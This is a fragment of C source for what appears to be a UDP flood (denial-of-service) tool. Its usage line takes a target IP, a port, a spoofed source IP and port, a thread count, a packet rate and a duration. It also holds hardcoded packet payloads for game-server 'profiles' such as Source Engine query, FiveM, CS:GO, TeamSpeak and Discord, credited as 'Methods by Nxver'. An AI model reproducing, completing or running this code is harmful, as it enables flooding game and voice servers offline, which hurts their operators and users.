...
int main(int argc, char* argv[]) {
	if (argc < 8) {
		fprintf(stdout, "Usage: %s <target IP> <port> <source port> <source IP> <threads> <pps limiter, -1 for no limit> <time> <profile>\nAvailable profiles: fivem1 fivem2 gmod csgo ts3 source discord sourcelite sourcelitev2\nMethods by Nxver\n", argv[0]);
		exit(-1);
	}
	int i = 0;
	int max_len = 128;
	...
	if (strcmp(oyun, "discord") == 0) {
		fprintf(stdout, "Discord Call\n");
		lench = 16;
		packetstrx = malloc(lench);
		memset(packetstrx, 0x00, lench);
		packetstrx = "\x13\x37\xca\xfe\x01\x00\x00\x00\x00\x64\x69\x73\x63\x6f\x72\x64";
	}
	
	if(strcmp(oyun, "sourcelite") == 0) {
		fprintf(stdout, "Source Lite\n");
		lench = 25;
		packetstrx = malloc(lench);
		memset(packetstrx, 0x00, lench);
		packetstrx = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
	...
	if(strcmp(oyun, "sourcelitev2") == 0) {
		fprintf(stdout, "Source Lite V2\n");
		lench = 20;
		packetstrx = malloc(lench);
		memset(packetstrx, 0x00, lench);
		packetstrx = "\xff\xff\xff\xff\x0030\x71\x92\x74\x3f\x44\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x00";
	}	
